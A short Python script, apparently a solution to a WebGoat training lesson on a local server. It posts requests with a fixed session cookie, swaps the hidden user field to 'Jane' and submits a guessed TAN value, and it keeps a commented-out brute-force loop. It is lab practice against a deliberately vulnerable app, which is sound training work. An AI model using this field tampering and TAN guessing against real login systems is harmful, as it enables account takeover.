#!/usr/bin/env python
# razor4x - tasteless
import requests, re
url = "http://localhost/WebGoat/attack?Screen=185&menu=500"

cookies = dict(JSESSIONID='95BB8E3D260AB81938E537A0E1914DE9')
payload = {'hidden_user':'Jane', 'tan2':'0', 'Submit':'Submit'}
for tan2_val in range(1):
	#payload['tan2'] = str(tan2_val)
	payload['tan2'] = str(4894)
	r = requests.post(url, params=payload, cookies=cookies)
	#print r.text
	if 'incorrect' in r.text:
		print 'bad luck!'
		pass
	else:
		print 'good luck', payload
	pass


